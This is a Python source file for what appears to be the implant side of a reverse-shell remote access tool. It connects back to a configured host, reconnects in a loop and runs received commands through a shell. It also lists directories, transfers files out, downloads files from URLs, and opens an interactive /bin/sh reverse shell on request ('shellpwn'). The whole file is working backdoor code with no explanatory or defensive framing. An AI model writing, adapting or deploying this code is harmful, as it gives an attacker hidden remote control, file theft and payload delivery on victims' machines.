import socket
import sys
import os
import subprocess
import select
import time
import ctypes
import urllib
import _thread
import RevNet

HOST="localhost"

PORT=9999

global s

def revshell(port):

	try:

		global HOST

		sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		sck.connect((socket.gethostbyname(HOST), port))
	
		os.dup2(sck.fileno(),0)

		os.dup2(sck.fileno(),1)

		os.dup2(sck.fileno(),2)

		p = subprocess.call(["/bin/sh", "-i"])

	except:

		pass

def download(url,fname):

    urllib.urlretrieve(url,fname)

    global s

    RevNet.send_all(s,b'ACK')

def reverseconn():

    global HOST

    global PORT

    host=socket.gethostbyname(HOST) 

    port=PORT

    global s

    s.connect((HOST,PORT))

    RevNet.send_all(s,str.encode(RevNet.enc(str(os.getcwd())+'> ')))

    while True:

        recvcmd=RevNet.recv_all(s)

        if RevNet.dec(recvcmd[:2].decode("utf-8"))=="cd":

            try:

                os.chdir(RevNet.dec(recvcmd[3:].decode("utf-8")))

            except:

                pass

            RevNet.send_all(s,str.encode(RevNet.enc(str(os.getcwd())+'> ')))

        elif RevNet.dec(recvcmd.decode("utf-8"))=="quit":

            break

        elif RevNet.dec(recvcmd.decode("utf-8"))=="ls":

            dirs=os.listdir('.')

            buf=''

            for d in dirs:

                buf+=d+'\n'

            RevNet.send_all(s,str.encode(RevNet.enc(buf+'`'+str(os.getcwd())+'>')))

        elif RevNet.dec(recvcmd.decode("utf-8"))=="kill_quit":

            s.close()

            sys.exit()

        elif RevNet.dec(recvcmd[:6].decode("utf-8"))=="ftrans":

            RevNet.frecv(s)

        elif RevNet.dec(recvcmd[:8].decode("utf-8"))=="download":

            download(RevNet.dec(recvcmd[9:].decode("utf-8")),RevNet.dec(RevNet.recv_all(s,1024).decode("utf-8")))

        elif RevNet.dec(recvcmd[:8].decode("utf-8"))=="shellpwn":

            try:

                prt=(int(RevNet.dec(recvcmd[9:].decode("utf-8"))))

                _thread.start_new_thread(revshell,(prt,))

            except:

                pass

            RevNet.send_all(s,str.encode(RevNet.enc('PWNED!')))

        elif RevNet.dec(recvcmd[:4].decode("utf-8"))=="fget":

            RevNet.ftrans(s,RevNet.dec(recvcmd[5:].decode("utf-8")))

            RevNet.send_all(s,str.encode(RevNet.enc(str(os.getcwd())+'> ')))

        elif len(recvcmd)>0 and RevNet.dec(recvcmd[:2].decode("utf-8"))!="cd":

            cmd = subprocess.Popen(RevNet.dec(recvcmd[:].decode("utf-8")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            obyte=cmd.stdout.read()+cmd.stderr.read()

            ostr=obyte.decode()

            RevNet.send_all(s,str.encode(RevNet.enc(ostr+'`'+str(os.getcwd())+'> ')))

    s.close()

while True:

    try:

        s=socket.socket()

        reverseconn()

    except socket.error:

        pass




    

    


        
